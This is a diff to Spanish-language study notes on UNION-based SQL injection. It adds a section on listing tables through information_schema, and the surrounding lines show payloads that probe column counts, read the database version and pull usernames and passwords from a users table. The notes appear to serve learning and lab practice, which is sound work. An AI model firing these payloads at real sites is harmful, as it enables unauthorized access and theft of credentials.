@@ -76,9 +76,23 @@ Verificar el tipo de datos que maneja cada columna debe de ser del mismo tipo pa
 >'UNION SELECT NULL,NULL,NULL--
 >' UNION SELECT 'abcdef',NULL,NULL--
 
+(falta investigar los datos de la base como nombre de tabla etc) 
+#### Enumerar datos de la base de datos
+
+La mayoría de los tipos de bases de datos (con la notable excepción de Oracle) tienen un conjunto de vistas llamado "information_schema" que proporciona información sobre la base de datos. Por ejemplo las ***tablas***
+
+```
+SELECT * FROM information_schema.tables
+
+```
+
+
+
+
+
 #### Paso 3 
 
-Sacar datos(falta investigar los datos de la base como nombre de tabla etc) 
+Sacar datos
 
 > ' UNION SELECT username, password FROM users--
 
@@ -113,7 +127,6 @@ Para la base de datos de mysql hay que tener algunas cosideraciones por ejemplo 
 si se puede usar -- pero requiere que se use un espacio al ultimo asi "-- " (sin comillas solo es el ejemplo)
 
 ```
-
 'UNION SELECT @@version,NULL#
 'union select @@version,null--
 
